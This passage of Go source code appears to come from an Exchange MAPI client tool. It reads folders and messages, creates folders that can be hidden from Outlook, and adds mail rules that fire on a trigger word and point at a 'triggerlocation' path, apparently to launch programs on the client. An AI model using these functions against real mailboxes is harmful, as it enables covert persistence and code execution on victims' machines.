		p, err := openFolder.Unmarshal(execResponse.RopBuffer[bufPtr:])
		if err != nil {
			return nil, err
		}
		bufPtr += p
		deleteMessageResponse := RopDeleteMessagesResponse{}

		_, e := deleteMessageResponse.Unmarshal(execResponse.RopBuffer[bufPtr:])
		if e != nil {
			return nil, fmt.Errorf("[x]An error occurred %s\n", e)
		}

		return &deleteMessageResponse, nil
	}

	return nil, fmt.Errorf("[x]Unspecified error occurred\n")
}

//GetFolder function get's a folder from the folders id
//FolderIds can be any of the "specialFolders" as defined in Exchange
//mapi/datastructs.go folder id/locations constants
func GetFolder(folderid int, columns []PropertyTag) (*RopOpenFolderResponse, error) {

	execRequest := ExecuteRequest{}
	execRequest.Init()
	//execRequest.MaxRopOut = 262144

	getFolder := RopOpenFolderRequest{RopID: 0x02, LogonID: AuthSession.LogonID}
	getFolder.InputHandle = 0x00
	getFolder.OutputHandle = 0x01
	getFolder.FolderID = AuthSession.Folderids[folderid]
	getFolder.OpenModeFlags = 0x00

	var k []byte

	if columns != nil {
		getProperties := RopGetPropertiesSpecific{}
		getProperties.RopID = 0x07
		getProperties.LogonID = AuthSession.LogonID
		getProperties.InputHandle = 0x01
		getProperties.PropertySizeLimit = 0x00
		getProperties.WantUnicode = []byte{0x00, 0x01}
		getProperties.PropertyTagCount = uint16(len(columns))
		getProperties.PropertyTags = columns

		k = append(getFolder.Marshal(), getProperties.Marshal()...)

	} else {
		k = getFolder.Marshal()
	}

	execRequest.RopBuffer.ROP.RopsList = k
	execRequest.RopBuffer.ROP.ServerObjectHandleTable = []byte{0x00, 0x00, 0x00, AuthSession.LogonID, 0xFF, 0xFF, 0xFF, 0xFF}

	//fetch folder
	responseBody, err := sendMapiRequest("Execute", execRequest)

	if err != nil {
		return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
	}
	execResponse := ExecuteResponse{}
	execResponse.Unmarshal(responseBody)

	if execResponse.StatusCode == 0 {
		bufPtr := 10
		openFolder := RopOpenFolderResponse{}
		_, err := openFolder.Unmarshal(execResponse.RopBuffer[bufPtr:])
		if err != nil {
			return nil, err
		}
		//this should be the handle to the folder
		//fmt.Println(execResponse.RopBuffer[len(execResponse.RopBuffer)-4:])
		return &openFolder, nil
	}

	return nil, fmt.Errorf("[x] An Unspecified error occurred")
}

//GetMessage returns the specific fields from a message
func GetMessage(folderid, messageid []byte, columns []PropertyTag) (*RopGetPropertiesSpecificResponse, error) {

	execRequest := ExecuteRequest{}
	execRequest.Init()

	ropRelease := RopReleaseRequest{RopID: 0x01, LogonID: AuthSession.LogonID, InputHandle: 0x01}
	fullReq := ropRelease.Marshal()

	getMessage := RopOpenMessageRequest{RopID: 0x03, LogonID: AuthSession.LogonID}
	getMessage.InputHandle = 0x00
	getMessage.OutputHandle = 0x01
	getMessage.FolderID = folderid
	getMessage.MessageID = messageid
	getMessage.CodePageID = 0xFFF
	getMessage.OpenModeFlags = 0x03

	fullReq = append(fullReq, getMessage.Marshal()...)

	getProperties := RopGetPropertiesSpecific{}
	getProperties.RopID = 0x07
	getProperties.LogonID = AuthSession.LogonID
	getProperties.InputHandle = 0x01
	getProperties.PropertySizeLimit = 0x00
	getProperties.WantUnicode = []byte{0x00, 0x01}
	getProperties.PropertyTagCount = uint16(len(columns))
	getProperties.PropertyTags = columns

	fullReq = append(fullReq, getProperties.Marshal()...)

	//queryRows := RopQueryRowsRequest{RopID: 0x15, LogonID: AuthSession.LogonID, InputHandle: 0x01, QueryRowsFlags: 0x00, ForwardRead: 0x01, RowCount: 0x32}
	//k = append(k, queryRows.Marshal()...)
	ropRelease = RopReleaseRequest{RopID: 0x01, LogonID: AuthSession.LogonID, InputHandle: 0x01}
	fullReq = append(fullReq, ropRelease.Marshal()...)

	execRequest.RopBuffer.ROP.RopsList = fullReq
	execRequest.RopBuffer.ROP.ServerObjectHandleTable = []byte{0x00, 0x00, 0x00, AuthSession.LogonID, 0xFF, 0xFF, 0xFF, 0xFF}

	//fetch folder
	responseBody, err := sendMapiRequest("Execute", execRequest)

	if err != nil {
		return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
	}
	execResponse := ExecuteResponse{}
	execResponse.Unmarshal(responseBody)

	if execResponse.StatusCode == 0 {
		if execResponse.RopBuffer[2] == 0x05 { //compression
			//decompress
		}
		bufPtr := 10

		if execResponse.RopBuffer[bufPtr : bufPtr+1][0] != 0x03 {
			bufPtr += 4
		}

		openMessage := RopOpenMessageResponse{}
		p, err := openMessage.Unmarshal(execResponse.RopBuffer[bufPtr:])
		if err != nil {
			return nil, err
		}
		bufPtr += p

		props := RopGetPropertiesSpecificResponse{}
		_, err = props.Unmarshal(execResponse.RopBuffer[bufPtr:], columns)
		if err != nil {
			return nil, err
		}

		return &props, nil
	}

	return nil, fmt.Errorf("[x] An Unspecified error occurred")
}

//GetMessageFast returns the specific fields from a message using the fast transfer buffers. This works better for large messages
func GetMessageFast(folderid, messageid []byte, columns []PropertyTag) (*RopFastTransferSourceGetBufferResponse, error) {

	execRequest := ExecuteRequest{}
	execRequest.Init()

	ropRelease := RopReleaseRequest{RopID: 0x01, LogonID: AuthSession.LogonID, InputHandle: 0x01}
	fullReq := ropRelease.Marshal()

	getMessage := RopOpenMessageRequest{RopID: 0x03, LogonID: AuthSession.LogonID}
	getMessage.InputHandle = 0x00
	getMessage.OutputHandle = 0x01
	getMessage.FolderID = folderid
	getMessage.MessageID = messageid
	getMessage.CodePageID = 0xFFF
	getMessage.OpenModeFlags = 0x03

	fullReq = append(fullReq, getMessage.Marshal()...)

	fastTransfer := RopFastTransferSourceCopyPropertiesRequest{RopID: 0x69, LogonID: AuthSession.LogonID, InputHandle: 0x01, OutputHandle: 0x02}
	fastTransfer.Level = 0
	fastTransfer.CopyFlags = 2
	fastTransfer.SendOptions = 1
	fastTransfer.PropertyTagCount = uint16(len(columns))
	fastTransfer.PropertyTags = columns

	fullReq = append(fullReq, fastTransfer.Marshal()...)

	fastTransferBuffer := RopFastTransferSourceGetBufferRequest{RopID: 0x4E, LogonID: AuthSession.LogonID, InputHandle: 0x02}
	fastTransferBuffer.BufferSize = 0xBABE
	fastTransferBuffer.MaximumBufferSize = 0xBABE

	fullReq = append(fullReq, fastTransferBuffer.Marshal()...)

	//queryRows := RopQueryRowsRequest{RopID: 0x15, LogonID: AuthSession.LogonID, InputHandle: 0x01, QueryRowsFlags: 0x00, ForwardRead: 0x01, RowCount: 0x32}
	//k = append(k, queryRows.Marshal()...)
	//ropRelease = RopReleaseRequest{RopID: 0x01, LogonID: AuthSession.LogonID, InputHandle: 0x01}
	//fullReq = append(fullReq, ropRelease.Marshal()...)

	execRequest.RopBuffer.ROP.RopsList = fullReq
	execRequest.RopBuffer.ROP.ServerObjectHandleTable = []byte{0x00, 0x00, 0x00, AuthSession.LogonID, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}

	//fetch folder
	responseBody, err := sendMapiRequest("Execute", execRequest)

	if err != nil {
		return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
	}
	execResponse := ExecuteResponse{}
	execResponse.Unmarshal(responseBody)

	if execResponse.StatusCode == 0 {
		if execResponse.RopBuffer[2] == 0x05 { //compression
			//decompress
		}
		bufPtr := 10

		if execResponse.RopBuffer[bufPtr : bufPtr+1][0] != 0x03 {
			bufPtr += 4
		}

		openMessage := RopOpenMessageResponse{}
		p, err := openMessage.Unmarshal(execResponse.RopBuffer[bufPtr:])
		if err != nil {
			return nil, err
		}
		bufPtr += p

		props := RopFastTransferSourceCopyPropertiesResponse{}
		p, err = props.Unmarshal(execResponse.RopBuffer[bufPtr:])
		if err != nil {
			return nil, err
		}
		bufPtr += p
		//fmt.Printf("%x\n", execResponse.RopBuffer[bufPtr:])
		pprops := RopFastTransferSourceGetBufferResponse{}
		p, err = pprops.Unmarshal(execResponse.RopBuffer[bufPtr:])
		if err != nil {
			return nil, err
		}
		fmt.Println("TransferStatus: ", pprops.TransferStatus) //0x0000 -- error 0x0001 -- partial
		fmt.Println("TotalStepCount: ", pprops.TotalStepCount)
		fmt.Println("InProgressCount: ", pprops.InProgressCount)

		//Rop release if we are done.. otherwise get rest of stream
		if pprops.TransferStatus == 0x0001 {
			buff, _ := FastTransferFetchStep(execResponse.RopBuffer[bufPtr+p:])

			if buff != nil {
				pprops.TransferBuffer = append(pprops.TransferBuffer, buff...)
			}
		}

		ReleaseObject(0x01)

		return &pprops, nil
	}
	return nil, fmt.Errorf("[x] An Unspecified error occurred")
}

//FastTransferFetchStep fetches the next part of a fast TransferBuffer
func FastTransferFetchStep(handles []byte) ([]byte, error) {
	execRequest := ExecuteRequest{}
	execRequest.Init()

	fastTransferBuffer := RopFastTransferSourceGetBufferRequest{RopID: 0x4E, LogonID: AuthSession.LogonID, InputHandle: 0x02}
	fastTransferBuffer.BufferSize = 0xBABE
	fastTransferBuffer.MaximumBufferSize = 0xBABE

	fullReq := fastTransferBuffer.Marshal()

	execRequest.RopBuffer.ROP.RopsList = fullReq
	execRequest.RopBuffer.ROP.ServerObjectHandleTable = append([]byte{0x00, 0x00, 0x00, AuthSession.LogonID}, handles...) //append(handles, []byte{0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}...) //[]byte{0x00, 0x00, 0x00, AuthSession.LogonID, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF} //append([]byte{0x00, 0x00, 0x00, AuthSession.LogonID}, handles...)

	//fetch folder
	responseBody, err := sendMapiRequest("Execute", execRequest)

	if err != nil {
		return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
	}
	execResponse := ExecuteResponse{}
	execResponse.Unmarshal(responseBody)

	if execResponse.StatusCode == 0 {
		if execResponse.RopBuffer[2] == 0x05 { //compression
			//decompress
		}
		bufPtr := 10

		//fmt.Printf("%x\n", execResponse.RopBuffer[:])
		pprops := RopFastTransferSourceGetBufferResponse{}
		p, err := pprops.Unmarshal(execResponse.RopBuffer[bufPtr:])
		if err != nil {
			return nil, err
		}
		fmt.Println("TransferStatus: ", pprops.TransferStatus) //0x0000 -- error 0x0001 -- partial
		fmt.Println("TotalStepCount: ", pprops.TotalStepCount)
		fmt.Println("InProgressCount: ", pprops.InProgressCount)

		//Rop release if we are done.. otherwise get rest of stream
		//fmt.Printf("%x\n", pprops.TransferBuffer)

		if pprops.TransferStatus == 0x0001 {
			buff, _ := FastTransferFetchStep(execResponse.RopBuffer[bufPtr+p:])
			//fmt.Println(string(buff), err)
			if buff != nil {
				pprops.TransferBuffer = append(pprops.TransferBuffer, buff...)

			}
		}

		return pprops.TransferBuffer, nil
	}

	return nil, fmt.Errorf("[x] An Unspecified error occurred")
}

//GetContentsTable function get's a folder from the folders id
//and returns a hanlde to the contents table for that folder
func GetContentsTable(folderid []byte) (*RopGetContentsTableResponse, []byte, error) {
	execRequest := ExecuteRequest{}
	execRequest.Init()
	ropRelease := RopReleaseRequest{RopID: 0x01, LogonID: AuthSession.LogonID, InputHandle: 0x01}
	fullReq := ropRelease.Marshal()

	getFolder := RopOpenFolderRequest{RopID: 0x02, LogonID: AuthSession.LogonID}
	getFolder.InputHandle = 0x00
	getFolder.OutputHandle = 0x01
	getFolder.FolderID = folderid
	getFolder.OpenModeFlags = 0x00
	//fullReq := getFolder.Marshal()
	fullReq = append(fullReq, getFolder.Marshal()...)

	getContents := RopGetContentsTableRequest{RopID: 0x05, LogonID: AuthSession.LogonID, InputHandleIndex: 0x01, OutputHandleIndex: 0x02, TableFlags: 0x40}

	fullReq = append(fullReq, getContents.Marshal()...)

	execRequest.RopBuffer.ROP.RopsList = fullReq
	execRequest.RopBuffer.ROP.ServerObjectHandleTable = []byte{0x00, 0x00, 0x00, AuthSession.LogonID, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}

	//fetch contents
	responseBody, err := sendMapiRequest("Execute", execRequest)

	if err != nil {
		return nil, nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
	}

	execResponse := ExecuteResponse{}
	execResponse.Unmarshal(responseBody)

	if execResponse.StatusCode == 0 {
		bufPtr := 10

		openFolder := RopOpenFolderResponse{}
		p, er := openFolder.Unmarshal(execResponse.RopBuffer[bufPtr:])
		if er != nil {
			return nil, nil, err
		}
		bufPtr += p

		ropContents := RopGetContentsTableResponse{}
		p, er = ropContents.Unmarshal(execResponse.RopBuffer[bufPtr:])
		if er != nil {
			return nil, nil, err
		}
		bufPtr += p + 8
		return &ropContents, execResponse.RopBuffer[bufPtr:], nil
	}

	return nil, nil, fmt.Errorf("[x] An Unspecified error occurred")
}

//GetFolderHierarchy function get's a folder from the folders id
//and returns a handle to the hierarchy table
func GetFolderHierarchy(folderid []byte) (*RopGetHierarchyTableResponse, []byte, error) {

	execRequest := ExecuteRequest{}
	execRequest.Init()
	execRequest.MaxRopOut = 262144

	getFolder := RopOpenFolderRequest{RopID: 0x02, LogonID: AuthSession.LogonID}
	getFolder.InputHandle = 0x00
	getFolder.OutputHandle = 0x01
	getFolder.FolderID = folderid
	getFolder.OpenModeFlags = 0x00
	fullReq := getFolder.Marshal()

	//set table flag as 0x04 | 0x40 (Depth and use unicode)
	getFolderHierarchy := RopGetHierarchyTableRequest{RopID: 0x04, LogonID: AuthSession.LogonID, InputHandle: 0x01, OutputHandle: 0x02, TableFlags: 0x40}
	fullReq = append(fullReq, getFolderHierarchy.Marshal()...)

	execRequest.RopBuffer.ROP.RopsList = fullReq
	execRequest.RopBuffer.ROP.ServerObjectHandleTable = []byte{0x00, 0x00, 0x00, AuthSession.LogonID, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}

	//fetch folder
	responseBody, err := sendMapiRequest("Execute", execRequest)

	if err != nil {
		return nil, nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
	}
	execResponse := ExecuteResponse{}
	execResponse.Unmarshal(responseBody)

	if execResponse.StatusCode == 0 {
		bufPtr := 10
		openFolder := RopOpenFolderResponse{}
		p, err := openFolder.Unmarshal(execResponse.RopBuffer[bufPtr:])
		if err != nil {
			return nil, nil, err
		}
		bufPtr += p

		hierarchyTableResponse := RopGetHierarchyTableResponse{}
		p, err = hierarchyTableResponse.Unmarshal(execResponse.RopBuffer[bufPtr:])
		if err != nil {
			return nil, nil, err
		}

		bufPtr += p + 8 //the serverhandle is the 3rd set of 4 bytes - we need this handle to access the hierarchy table

		return &hierarchyTableResponse, execResponse.RopBuffer[bufPtr:], nil

	}
	return nil, nil, fmt.Errorf("[x] An Unspecified error occurred")
}

//GetSubFolders returns all the subfolders available in a folder
func GetSubFolders(folderid []byte) (*RopQueryRowsResponse, error) {
	folderHeirarchy, svrhndl, err := GetFolderHierarchy(folderid)
	if err != nil {
		return nil, err
	}

	execRequest := ExecuteRequest{}
	execRequest.Init()

	setColumns := RopSetColumnsRequest{RopID: 0x12, LogonID: AuthSession.LogonID}
	setColumns.InputHandle = 0x01
	setColumns.PropertyTagCount = 2
	setColumns.PropertyTags = make([]PropertyTag, 2)
	setColumns.PropertyTags[0] = PidTagDisplayName
	setColumns.PropertyTags[1] = PidTagFolderID

	fullReq := setColumns.Marshal()
	//fmt.Println(folderHeirarchy.RowCount)
	queryRows := RopQueryRowsRequest{RopID: 0x15, LogonID: AuthSession.LogonID, InputHandle: 0x01, QueryRowsFlags: 0x00, ForwardRead: 0x01, RowCount: uint16(folderHeirarchy.RowCount)}
	fullReq = append(fullReq, queryRows.Marshal()...)
	execRequest.RopBuffer.ROP.RopsList = fullReq
	execRequest.RopBuffer.ROP.ServerObjectHandleTable = append([]byte{0x01, 0x00, 0x00, AuthSession.LogonID}, svrhndl...)

	responseBody, err := sendMapiRequest("Execute", execRequest)

	if err != nil {
		return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
	}
	execResponse := ExecuteResponse{}
	execResponse.Unmarshal(responseBody)

	if execResponse.StatusCode == 0 {
		bufPtr := 10

		setColumnsResp := RopSetColumnsResponse{}
		p, err := setColumnsResp.Unmarshal(execResponse.RopBuffer[bufPtr:])
		if err != nil {
			return nil, err
		}
		bufPtr += p

		rows := RopQueryRowsResponse{}

		_, err = rows.Unmarshal(execResponse.RopBuffer[bufPtr:], setColumns.PropertyTags)
		if err != nil {
			return nil, err
		}
		return &rows, nil
	}

	return nil, fmt.Errorf("[x] An unexpected error occurred")
}

//CreateFolder function to create a folder on the exchange server
func CreateFolder(folderName string, hidden bool) (*RopCreateFolderResponse, error) {
	execRequest := ExecuteRequest{}
	execRequest.Init()
	execRequest.MaxRopOut = 262144

	createFolder := RopCreateFolderRequest{RopID: 0x1C, LogonID: AuthSession.LogonID, InputHandle: 0x00, OutputHandle: 0x01, Reserved: 0x00}
	createFolder.FolderType = 0x01
	createFolder.UseUnicodeStrings = 0x01
	createFolder.OpenExisting = 0x00
	createFolder.DisplayName = utils.UniString(folderName)
	createFolder.Comment = utils.UniString("some comment")
	fullReq := createFolder.Marshal()

	//if we want to create a hidden folder (so it doesn't show up in Outlook)
	if hidden == true {
		setProperties := RopSetPropertiesRequest{RopID: 0x0A, LogonID: AuthSession.LogonID}
		setProperties.InputHandle = 0x01
		setProperties.PropertValueCount = 1

		propertyTags := make([]TaggedPropertyValue, setProperties.PropertValueCount)
		propertyTags[0] = TaggedPropertyValue{PidTagHidden, []byte{0x01}}

		setProperties.PropertyValues = propertyTags
		propertySize := 0
		for _, p := range propertyTags {
			propertySize += len(utils.BodyToBytes(p))
		}

		setProperties.PropertValueSize = uint16(propertySize + 2)

		fullReq = append(fullReq, setProperties.Marshal()...)
	}
	execRequest.RopBuffer.ROP.RopsList = fullReq
	execRequest.RopBuffer.ROP.ServerObjectHandleTable = []byte{0x01, 0x00, 0x00, AuthSession.LogonID, 0xFF, 0xFF, 0xFF, 0xFF}

	//fetch folder
	responseBody, err := sendMapiRequest("Execute", execRequest)

	if err != nil {
		return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
	}
	execResponse := ExecuteResponse{}
	execResponse.Unmarshal(responseBody)

	if execResponse.StatusCode == 0 {
		bufPtr := 10
		createFolder := RopCreateFolderResponse{}
		_, err = createFolder.Unmarshal(execResponse.RopBuffer[bufPtr:])
		if err != nil {
			fmt.Println(err)
			return nil, err
		}
		if hidden == true {
			propResp := RopSetPropertiesResponse{}
			_, er := propResp.Unmarshal(execResponse.RopBuffer[bufPtr:])
			if er != nil {
				return nil, er
			}
		}

		return &createFolder, nil
	}

	return nil, fmt.Errorf("[x] An Unspecified error occurred")
}

//GetContents returns the rows of a folder's content table
func GetContents(folderid []byte) (*RopQueryRowsResponse, error) {
	contentsTable, svrhndl, err := GetContentsTable(folderid)
	if err != nil || contentsTable == nil {
		return nil, err
	}

	execRequest := ExecuteRequest{}
	execRequest.Init()

	setColumns := RopSetColumnsRequest{RopID: 0x12, LogonID: AuthSession.LogonID, SetColumnFlags: 0x00}
	setColumns.InputHandle = 0x01
	setColumns.PropertyTagCount = 2
	setColumns.PropertyTags = make([]PropertyTag, setColumns.PropertyTagCount)
	setColumns.PropertyTags[0] = PidTagSubject
	//setColumns.PropertyTags[1] = PidTagBodyHtml
	setColumns.PropertyTags[1] = PidTagMid

	fullReq := setColumns.Marshal()

	queryRows := RopQueryRowsRequest{RopID: 0x15, LogonID: AuthSession.LogonID, InputHandle: 0x01, QueryRowsFlags: 0x00, ForwardRead: 0x01, RowCount: uint16(contentsTable.RowCount)}
	fullReq = append(fullReq, queryRows.Marshal()...)

	ropRelease := RopReleaseRequest{RopID: 0x01, LogonID: AuthSession.LogonID, InputHandle: 0x01}
	fullReq = append(fullReq, ropRelease.Marshal()...)

	execRequest.RopBuffer.ROP.RopsList = fullReq
	execRequest.RopBuffer.ROP.ServerObjectHandleTable = append([]byte{0x01, 0x00, 0x00, AuthSession.LogonID}, svrhndl...)

	responseBody, err := sendMapiRequest("Execute", execRequest)

	if err != nil {
		return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
	}
	execResponse := ExecuteResponse{}
	execResponse.Unmarshal(responseBody)

	if execResponse.StatusCode == 0 {
		bufPtr := 10
		if execResponse.RopBuffer[2] == 0x05 { //compression
			//decompress
			//Decompress(execResponse.RopBuffer[6:])
		}

		setColumnsResp := RopSetColumnsResponse{}
		p, err := setColumnsResp.Unmarshal(execResponse.RopBuffer[bufPtr:])
		if err != nil {
			return nil, err
		}
		bufPtr += p

		rows := RopQueryRowsResponse{}

		_, err = rows.Unmarshal(execResponse.RopBuffer[bufPtr:], setColumns.PropertyTags)
		if err != nil {
			return nil, err
		}
		return &rows, nil
	}

	return nil, fmt.Errorf("[x] An Unspecified error occurred")
}

//DisplayRules function get's a folder from the folders id
func DisplayRules() ([]Rule, error) {

	execRequest := ExecuteRequest{}
	execRequest.Init()

	getRulesFolder := RopGetRulesTableRequest{RopID: 0x3f, LogonID: AuthSession.LogonID, InputHandleIndex: 0x00, OutputHandleIndex: 0x01, TableFlags: 0x40}
	//RopSetColumns
	setColumns := RopSetColumnsRequest{RopID: 0x12, LogonID: AuthSession.LogonID}
	setColumns.InputHandle = 0x01
	setColumns.PropertyTagCount = 0x02
	setColumns.PropertyTags = make([]PropertyTag, 2)
	setColumns.PropertyTags[0] = PidTagRuleID
	setColumns.PropertyTags[1] = PidTagRuleName

	//RopQueryRows
	queryRows := RopQueryRowsRequest{RopID: 0x15, LogonID: AuthSession.LogonID, InputHandle: 0x01, QueryRowsFlags: 0x00, ForwardRead: 0x01, RowCount: 0x32}

	getRules := append(getRulesFolder.Marshal(), setColumns.Marshal()...)
	getRules = append(getRules, queryRows.Marshal()...)

	execRequest.RopBuffer.ROP.RopsList = getRules
	execRequest.RopBuffer.ROP.ServerObjectHandleTable = []byte{0x01, 0x00, 0x00, AuthSession.LogonID, 0xFF, 0xFF, 0xFF, 0xFF}

	//fetch folder
	responseBody, err := sendMapiRequest("Execute", execRequest)

	if err != nil {
		return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
	}
	execResponse := ExecuteResponse{}
	execResponse.Unmarshal(responseBody)

	rules, _ := DecodeRulesResponse(execResponse.RopBuffer, setColumns.PropertyTags)
	if rules == nil {
		return nil, fmt.Errorf("[x] Error retrieving rules")
	}
	return rules, nil

	//return nil, fmt.Errorf("[x] An Unspecified error occurred")
}

//ExecuteMailRuleAdd adds a new mailrules
func ExecuteMailRuleAdd(rulename, triggerword, triggerlocation string, delete bool) (*ExecuteResponse, error) {
	//valid
	var delbit byte = 0x04
	if delete == true {
		delbit = 0x06
	}
	execRequest := ExecuteRequest{}
	execRequest.Init()
	execRequest.MaxRopOut = 262144

	addRule := RopModifyRulesRequest{RopID: 0x41, LoginID: AuthSession.LogonID, InputHandleIndex: 0x00, ModifyRulesFlag: 0x00, RulesCount: 0x01, RuleData: RuleData{RuleDataFlags: 0x01}}

	propertyValues := make([]TaggedPropertyValue, 8)
	//RUle Name
	propertyValues[0] = TaggedPropertyValue{PidTagRuleName, utils.UniString(rulename)}                                                                                                                                         //PidTagRuleSequence
	propertyValues[1] = TaggedPropertyValue{PidTagRuleSequence, []byte{0x0A, 0x00, 0x00, 0x00}}                                                                                                                                //PidTagRuleState (Enabled)
	propertyValues[2] = TaggedPropertyValue{PidTagRuleState, []byte{0x01, 0x00, 0x00, 0x00}}                                                                                                                                   //PidTagRuleCondition
	propertyValues[3] = TaggedPropertyValue{PidTagRuleCondition, utils.BodyToBytes(RuleCondition{0x03, []byte{0x01, 0x00, 0x01, 0x00}, []byte{0x1F, 0x00, 0x37, 0x00, 0x1f, 0x00, 0x37, 0x00}, utils.UniString(triggerword)})} //PidTagRuleActions

	actionData := ActionData{}
	actionData.ActionElem = []byte{0x00, 0x00, 0x14}
	actionData.ActionName = utils.UTF16BE(rulename, 1)
	actionData.Element = []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0xa8, 0x00, 0x00, 0x00, delbit, 0x00, 0xff, 0xff, 0x00, 0x00, 0x0c, 0x00, 0x43, 0x52, 0x75, 0x6c, 0x65, 0x45, 0x6c, 0x65, 0x6d, 0x65, 0x6e, 0x74, 0x90, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x80, 0x64, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x80, 0xcd, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
	actionData.Triggger = utils.UTF16BE(triggerword, 1)
	actionData.Elem = []byte{0x80, 0x49, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
	actionData.EndPoint = append(utils.UTF16BE(triggerlocation, 1), []byte{0x80, 0x4a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x80, 0x42, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}...)

	ruleAction := RuleAction{Actions: 1, ActionType: 0x05, ActionFlavor: 0, ActionFlags: 0}
	ruleAction.ActionLen = uint16(len(utils.BodyToBytes(actionData)) + 9)
	ruleAction.ActionData = actionData

	pdat := ruleAction.Marshal()

	propertyValues[4] = TaggedPropertyValue{PidTagRuleActions, pdat}                              //PidTagRuleProvider
	propertyValues[5] = TaggedPropertyValue{PidTagRuleProvider, utils.UniString("RuleOrganizer")} //PidTagRuleLevel
	propertyValues[6] = TaggedPropertyValue{PidTagRuleLevel, []byte{0x00, 0x00, 0x00, 0x00}}      //PidTagRuleProviderData
	propertyValues[7] = TaggedPropertyValue{PidTagRuleProviderData, []byte{0x10, 0x00, 0x00, 0x00, 0x14, 0x00, 0x01, 0x00, 0x00, 0x00, 0x28, 0x7d, 0xd2, 0x27, 0x14, 0xc4, 0xe4, 0x40}}

	addRule.RuleData.PropertyValues = propertyValues
	addRule.RuleData.PropertyValueCount = uint16(len(propertyValues))
	ruleBytes := utils.BodyToBytes(addRule)

	execRequest.RopBuffer.ROP.RopsList = ruleBytes
	execRequest.RopBuffer.ROP.ServerObjectHandleTable = []byte{0x01, 0x00, 0x00, AuthSession.LogonID} //append(AuthSession.RulesHandle, []byte{0xFF, 0xFF, 0xFF, 0xFF}...)

	responseBody, err := sendMapiRequest("Execute", execRequest)

	if err != nil {
		return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
	}
	execResponse := ExecuteResponse{}
	execResponse.Unmarshal(responseBody)
	return &execResponse, nil

	//return nil, fmt.Errorf("[x] An Unspecified error occurred")
}

//ExecuteMailRuleDelete function to delete mailrules
func ExecuteMailRuleDelete(ruleid []byte) error {
	execRequest := ExecuteRequest{}
	execRequest.Init()
	execRequest.MaxRopOut = 262144

	delRule := RopModifyRulesRequest{RopID: 0x41, LoginID: AuthSession.LogonID, InputHandleIndex: 0x00, ModifyRulesFlag: 0x00, RulesCount: 0x01, RuleData: RuleData{}}
	delRule.RuleData.RuleDataFlags = 0x04
	delRule.RuleData.PropertyValueCount = 0x01
	delRule.RuleData.PropertyValues = make([]TaggedPropertyValue, 1)
	delRule.RuleData.PropertyValues[0] = TaggedPropertyValue{PidTagRuleID, ruleid}

	ruleBytes := utils.BodyToBytes(delRule)
	execRequest.RopBuffer.ROP.RopsList = ruleBytes
	execRequest.RopBuffer.ROP.ServerObjectHandleTable = []byte{0x01, 0x00, 0x00, AuthSession.LogonID} //append(AuthSession.RulesHandle, []byte{0xFF, 0xFF, 0xFF, 0xFF}...)

	responseBody, err := sendMapiRequest("Execute", execRequest)

	if err != nil {
		return fmt.Errorf("[x] A HTTP server side error occurred while deleting the rule.\n %s", err)
	}
	execResponse := ExecuteResponse{}
	execResponse.Unmarshal(responseBody)

	if execResponse.StatusCode == 0 {
		return nil
	}
	return fmt.Errorf("[x] A server side error occurred while deleting the rule. Check ruleid")

}

//Ping send a PING message to the server
func Ping() {
	//for RPC we need to keep the socket alive so keep sending pings
	if AuthSession.Transport != HTTP {
		for {
			runtime.Gosched()
			rpchttp.RPCPing()
			time.Sleep(time.Second * 5)
		}
	}
}

//DecodeGetTableResponse function Unmarshals the various parts of a getproperties response (this includes the initial openfolder request)
//and returns the RopGetPropertiesSpecificResponse object to us, we can then cycle through the rows to view the values
//needs the list of columns that were supplied in the initial request.
func DecodeGetTableResponse(resp []byte, columns []PropertyTag) (*RopGetPropertiesSpecificResponse, error) {
	pos := 10

	var err error

	openFolderResp := RopOpenFolderResponse{}
	pos, err = openFolderResp.Unmarshal(resp[pos:])
	if err != nil {
		return nil, err
	}
	properties := RopGetPropertiesSpecificResponse{}
	_, err = properties.Unmarshal(resp[pos:], columns)

	if err != nil {
		return nil, err
	}

	return &properties, nil
}

//DecodeRulesResponse func
func DecodeRulesResponse(resp []byte, properties []PropertyTag) ([]Rule, []byte) {

	pos, tpos := 10, 0
	var err error

	rulesTableResponse := RopGetRulesTableResponse{}
	tpos, err = rulesTableResponse.Unmarshal(resp[pos:])
	pos += tpos

	if err != nil {
		fmt.Println(err)
		return nil, nil
	}
	columns := RopSetColumnsResponse{}
	tpos, err = columns.Unmarshal(resp[pos:])
	pos += tpos

	if err != nil {
		fmt.Println("Bad SetColumns")
		return nil, nil
	}

	rows := RopQueryRowsResponse{}
	tpos, err = rows.Unmarshal(resp[pos:], properties)
	if err != nil {
		fmt.Println("Bad QueryRows")
		return nil, nil
	}
	pos += tpos

	rules := make([]Rule, int(rows.RowCount))

